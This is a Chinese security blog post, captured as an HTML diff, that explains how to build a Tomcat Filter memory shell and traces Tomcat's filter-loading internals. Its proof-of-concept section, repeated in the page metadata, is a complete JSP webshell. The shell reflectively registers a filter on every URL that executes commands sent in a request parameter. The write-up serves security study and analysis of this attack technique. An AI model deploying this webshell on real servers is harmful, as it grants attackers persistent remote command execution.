@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Tomcat Filter内存马 | Jiecub3</title>
+<meta name="keywords" content="">
+<meta name="description" content="hhh，Listener内存马分析完后，自己尝试构造了Filter poc，最后没借助分析文章构造出来挺兴奋的hh 环境 &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;9.0.96&lt;/version&gt; &lt;/dependency&gt; 先贴poc吧，">
+<meta name="author" content="Jiecub3">
+<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
+<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Tomcat Filter内存马" />
+<meta property="og:description" content="hhh，Listener内存马分析完后，自己尝试构造了Filter poc，最后没借助分析文章构造出来挺兴奋的hh 环境 &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;9.0.96&lt;/version&gt; &lt;/dependency&gt; 先贴poc吧，" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-11-01T21:01:23+08:00" />
+<meta property="article:modified_time" content="2024-11-01T21:01:23+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Tomcat Filter内存马"/>
+<meta name="twitter:description" content="hhh，Listener内存马分析完后，自己尝试构造了Filter poc，最后没借助分析文章构造出来挺兴奋的hh 环境 &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;9.0.96&lt;/version&gt; &lt;/dependency&gt; 先贴poc吧，"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Jiecub3.github.io/zh/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Tomcat Filter内存马",
+      "item": "https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Tomcat Filter内存马",
+  "name": "Tomcat Filter内存马",
+  "description": "hhh，Listener内存马分析完后，自己尝试构造了Filter poc，最后没借助分析文章构造出来挺兴奋的hh 环境 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;9.0.96\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 先贴poc吧，",
+  "keywords": [
+    
+  ],
+  "articleBody": "hhh，Listener内存马分析完后，自己尝试构造了Filter poc，最后没借助分析文章构造出来挺兴奋的hh\n环境 \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat\u003c/groupId\u003e \u003cartifactId\u003etomcat-catalina\u003c/artifactId\u003e \u003cversion\u003e9.0.96\u003c/version\u003e \u003c/dependency\u003e 先贴poc吧，想看着写流程\n0x01 poc \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"javax.security.auth.message.callback.SecretKeyCallback\" %\u003e \u003c%@ page import=\"org.apache.catalina.connector.Request\" %\u003e \u003c%@ page import=\"org.apache.catalina.connector.Response\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationContextFacade\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationContext\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"java.io.*\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %\u003e \u003c%@ page import=\"javax.servlet.annotation.WebFilter\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %\u003e \u003c%@ page import=\"java.util.Map\" %\u003e \u003c%@ page import=\"java.lang.reflect.Constructor\" %\u003e \u003c%@ page import=\"org.apache.catalina.Context\" %\u003e \u003c% //反射得到StandardContext ApplicationContextFacade servletContext = (ApplicationContextFacade) request.getServletContext(); Field con = servletContext.getClass().getDeclaredField(\"context\"); con.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) con.get(servletContext); Field context = applicationContext.getClass().getDeclaredField(\"context\"); context.setAccessible(true); StandardContext Standardcontext1 = (StandardContext) context.get(applicationContext); @WebFilter(filterName = \"MyFilter\", urlPatterns = \"/*\") class myFilter implements Filter{ @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { try { String cmd = request.getParameter(\"cmd\"); Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); // 设置响应头，确保客户端能正确接收文本数据 response.setContentType(\"text/plain\"); response.setCharacterEncoding(\"UTF-8\"); // 获取输出流，用于向客户端发送数据 PrintWriter writer = response.getWriter(); String line; while ((line = reader.readLine())!= null) { writer.write(line + \"\\n\"); } // 关闭相关资源 reader.close(); inputStream.close(); writer.close(); chain.doFilter(request, response); } catch (Exception e) { throw new RuntimeException(e); } } }; FilterDef filterDef = new FilterDef(); myFilter myFilter = new myFilter(); filterDef.setFilter(myFilter); filterDef.setFilterName(\"myFilter\"); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(\"myFilter\"); filterMap.addURLPattern(\"/*\"); Standardcontext1.addFilterDef(filterDef); Standardcontext1.addFilterMap(filterMap); Field filterConfigs = Standardcontext1.getClass().getDeclaredField(\"filterConfigs\"); filterConfigs.setAccessible(true); Map map = (Map) filterConfigs.get(Standardcontext1); Class\u003c?\u003e aClass = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\"); Constructor\u003c?\u003e declaredConstructor = aClass.getDeclaredConstructor(Context.class, FilterDef.class); declaredConstructor.setAccessible(true); ApplicationFilterConfig myconfig = (ApplicationFilterConfig) declaredConstructor.newInstance(Standardcontext1, filterDef); map.put(\"myFilter\", myconfig); out.println(1111111); %\u003e 0x02 分析流程 先通过这个demo，调试分析，看什么地方调试我们的doFilter\npackage com.example.learnservlet; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import java.io.IOException; @WebFilter(filterName = \"TestFilter\", urlPatterns = \"/test/*\") public class TestFilter implements Filter { @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\"filter\"); chain.doFilter(request, response); } } 和listener一样的思路的话，这里我们就是要添加恶意filter到filters里\n然后我们找到addFilter，通过栈，我们发现每次请求ApplicationFilterFactory都会调用ApplicationFilterChain.addFilter()方法\n这里我们往上查看\nfilterMaps实际来自StandardContext，查看findFilterMaps方法，发现filterMaps\n然后我们看到addFilterMap方法，这里就想到我们获得StandardContext实例后调用这个方法插入filter，不久行了嘛\n但这里我们查看filterMaps并没有我们的Filter类属性，我们该怎么传入我们的Filter实例呢\n然后看调用栈往上看到在调用addFilterMap方法前会先调用addFilterDef方法\n这里去FilterDef去查找一番，发现有设置Filter，那么这个地方多半是传入Filter的地方了\n但是最后调用的filterMaps和FilterDef有什么关系呢，其实filter更像存储Filter基本信息（Filter名字，url）等，而FilterDef则储存Filter名字对应的Filter实例\nfilterDefs.put(filterDef.getFilterName(), filterDef); 这里put，第一个参数就是Filter名字。\n然后通过其他demoFilter的我们大概也知道filterMaps要设置什么值（Filter名字，url）\n然后尝试构造poc，最后写入filter代码长这样\nFilterDef filterDef = new FilterDef(); myFilter myFilter = new myFilter(); filterDef.setFilter(myFilter); filterDef.setFilterName(\"myFilter\"); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(\"myFilter\"); filterMap.addURLPattern(\"/*\"); Standardcontext1.addFilterDef(filterDef); Standardcontext1.addFilterMap(filterMap); 运行后，执行发现没反应，调试发现漏了一处地方\n这里我的filterMaps已经有我自己的filterMap了，但是执行我的filterMap时进入了最后这个continue\n发现filterConfig没有值，起初没细看这里，以为这里是用来封装的，到filterMap构造就能成功执行。\n倒回来我们跟进findFilterConfig方法，然后再查看filterConfigs哪些地方调用过\n查看完，发现也只有**filterStart()**方法这里进行过赋值\n看到这，思路也清晰了，就是反射获取filterConfigs再put一个ApplicationFilterConfig，查看自构方法参数，然后不是public，这个构造方法也要通过反射然后实例化\nFilter传参带有response，不用考虑获取，servletContext和Listener一样的获取方式，然后就可以完整poc啦\nFilter 的加载流程如下\n通过 ApplicationFilterFactory.createFilterChain() 创建 FilterChain 调用 StandardContext.findFilterMaps() 得到 filterMaps 遍历 filterMaps, 依次从 StandardContext 中用 filterMap.getFilterName() 获取对应的 filterConfig, 并将其放入 FilterChain 执行 FilterChain.doFilter() 并在内部调用 internalDoFilter 方法 依次执行 filterConfig.getFilter() 获取 Filter 实例, 并最终调用其 doFilter 方法 感觉自己第一次写，有些潦草，也不想大改了（懒）\n0x03 补充 这里补充下流程，直接借用其他大佬的图了\n调用栈\n直接跳转到 StandardWrapperValve 执行了 filterChain.doFilter 方法, 继续跟进\n然后我们回到 StandardWrapperValve, 往前面翻翻看这个 filterChain 是怎么来的\n这里通过 ApplicationFilterFactory.createFilterChain() 创建 filterChain\n需要注意创建过程是动态的, 即我们每发起一次请求, tomcat 都会执行一遍 createFilterChain, 这也为后面内存马的植入做了铺垫\n跟进 createFilterChain 方法\n首先从 Request 对象中获取 filterChain, 如果 filterChain 不存在, 就自己新建一个, 再设置到 req 内\n然后从 wrapper 中获取 StandardContext 对象, 并且调用 findFilterMaps 方法得到 filterMaps\n最后遍历 filterMaps, 通过 filterMap.getFilterName() 从 context 中寻找对应的 FilterConfig 并且添加至 filterChain\n",
+  "wordCount" : "1770",
+  "inLanguage": "zh",
+  "datePublished": "2024-11-01T21:01:23+08:00",
+  "dateModified": "2024-11-01T21:01:23+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Jiecub3"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Jiecub3",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Jiecub3.github.io/img/logo.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://Jiecub3.github.io/zh/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
+                    <span>搜索🔍︎</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Tomcat Filter内存马
+    </h1>
+    <div class="post-meta"><span title='2024-11-01 21:01:23 +0800 CST'>2024-11-01</span>&nbsp;·&nbsp;4 分钟&nbsp;·&nbsp;Jiecub3
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e7%8e%af%e5%a2%83" aria-label="环境">环境</a></li>
+                    <li>
+                        <a href="#0x01-poc" aria-label="0x01 poc">0x01 poc</a></li>
+                    <li>
+                        <a href="#0x02-%e5%88%86%e6%9e%90%e6%b5%81%e7%a8%8b" aria-label="0x02 分析流程">0x02 分析流程</a></li>
+                    <li>
+                        <a href="#0x03-%e8%a1%a5%e5%85%85" aria-label="0x03 补充">0x03 补充</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><p>hhh，Listener内存马分析完后，自己尝试构造了Filter poc，最后没借助分析文章构造出来挺兴奋的hh</p>
+<h1 id="环境">环境<a hidden class="anchor" aria-hidden="true" href="#环境">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">tomcat</span><span class="o">-</span><span class="n">catalina</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">9</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">96</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></div><p>先贴poc吧，想看着写流程</p>
+<h1 id="0x01-poc">0x01 poc<a hidden class="anchor" aria-hidden="true" href="#0x01-poc">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.security.auth.message.callback.SecretKeyCallback&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.connector.Response&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContextFacade&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.io.*&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.servlet.annotation.WebFilter&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationFilterConfig&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.util.Map&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Constructor&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.Context&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">  //反射得到StandardContext
+</span></span><span class="line"><span class="cl">  ApplicationContextFacade servletContext = (ApplicationContextFacade) request.getServletContext();
+</span></span><span class="line"><span class="cl">  Field con = servletContext.getClass().getDeclaredField(&#34;context&#34;);
+</span></span><span class="line"><span class="cl">  con.setAccessible(true);
+</span></span><span class="line"><span class="cl">  ApplicationContext applicationContext = (ApplicationContext) con.get(servletContext);
+</span></span><span class="line"><span class="cl">  Field context = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
+</span></span><span class="line"><span class="cl">  context.setAccessible(true);
+</span></span><span class="line"><span class="cl">  StandardContext Standardcontext1 = (StandardContext) context.get(applicationContext);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  @WebFilter(filterName = &#34;MyFilter&#34;, urlPatterns = &#34;/*&#34;)
+</span></span><span class="line"><span class="cl">  class myFilter implements Filter{
+</span></span><span class="line"><span class="cl">    @Override
+</span></span><span class="line"><span class="cl">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+</span></span><span class="line"><span class="cl">      try {
+</span></span><span class="line"><span class="cl">        String cmd = request.getParameter(&#34;cmd&#34;);
+</span></span><span class="line"><span class="cl">        Process exec = Runtime.getRuntime().exec(cmd);
+</span></span><span class="line"><span class="cl">        InputStream inputStream = exec.getInputStream();
+</span></span><span class="line"><span class="cl">        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+</span></span><span class="line"><span class="cl">        // 设置响应头，确保客户端能正确接收文本数据
+</span></span><span class="line"><span class="cl">        response.setContentType(&#34;text/plain&#34;);
+</span></span><span class="line"><span class="cl">        response.setCharacterEncoding(&#34;UTF-8&#34;);
+</span></span><span class="line"><span class="cl">        // 获取输出流，用于向客户端发送数据
+</span></span><span class="line"><span class="cl">        PrintWriter writer = response.getWriter();
+</span></span><span class="line"><span class="cl">        String line;
+</span></span><span class="line"><span class="cl">        while ((line = reader.readLine())!= null) {
+</span></span><span class="line"><span class="cl">          writer.write(line + &#34;\n&#34;);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        // 关闭相关资源
+</span></span><span class="line"><span class="cl">        reader.close();
+</span></span><span class="line"><span class="cl">        inputStream.close();
+</span></span><span class="line"><span class="cl">        writer.close();
+</span></span><span class="line"><span class="cl">        chain.doFilter(request, response);
+</span></span><span class="line"><span class="cl">      } catch (Exception e) {
+</span></span><span class="line"><span class="cl">        throw new RuntimeException(e);
+</span></span><span class="line"><span class="cl">      }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">  };
+</span></span><span class="line"><span class="cl">  FilterDef filterDef = new FilterDef();
+</span></span><span class="line"><span class="cl">  myFilter myFilter = new myFilter();
+</span></span><span class="line"><span class="cl">  filterDef.setFilter(myFilter);
+</span></span><span class="line"><span class="cl">  filterDef.setFilterName(&#34;myFilter&#34;);
+</span></span><span class="line"><span class="cl">  FilterMap filterMap = new FilterMap();
+</span></span><span class="line"><span class="cl">  filterMap.setFilterName(&#34;myFilter&#34;);
+</span></span><span class="line"><span class="cl">  filterMap.addURLPattern(&#34;/*&#34;);
+</span></span><span class="line"><span class="cl">  Standardcontext1.addFilterDef(filterDef);
+</span></span><span class="line"><span class="cl">  Standardcontext1.addFilterMap(filterMap);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Field filterConfigs = Standardcontext1.getClass().getDeclaredField(&#34;filterConfigs&#34;);
+</span></span><span class="line"><span class="cl">  filterConfigs.setAccessible(true);
+</span></span><span class="line"><span class="cl">  Map map = (Map) filterConfigs.get(Standardcontext1);
+</span></span><span class="line"><span class="cl">  Class&lt;?&gt; aClass = Class.forName(&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;);
+</span></span><span class="line"><span class="cl">  Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Context.class, FilterDef.class);
+</span></span><span class="line"><span class="cl">  declaredConstructor.setAccessible(true);
+</span></span><span class="line"><span class="cl">  ApplicationFilterConfig myconfig = (ApplicationFilterConfig) declaredConstructor.newInstance(Standardcontext1, filterDef);
+</span></span><span class="line"><span class="cl">  map.put(&#34;myFilter&#34;, myconfig);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  out.println(1111111);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></div><h1 id="0x02-分析流程">0x02 分析流程<a hidden class="anchor" aria-hidden="true" href="#0x02-分析流程">#</a></h1>
+<p>先通过这个demo，调试分析，看什么地方调试我们的doFilter</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.learnservlet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.WebFilter</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@WebFilter</span><span class="p">(</span><span class="n">filterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;TestFilter&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">urlPatterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/test/*&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestFilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;filter&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20241031185122265.png" alt="image-20241031185122265"  />
+</p>
+<p>和listener一样的思路的话，这里我们就是要添加恶意filter到filters里</p>
+<p><img loading="lazy" src="images/image-20241031185153489.png" alt="image-20241031185153489"  />
+</p>
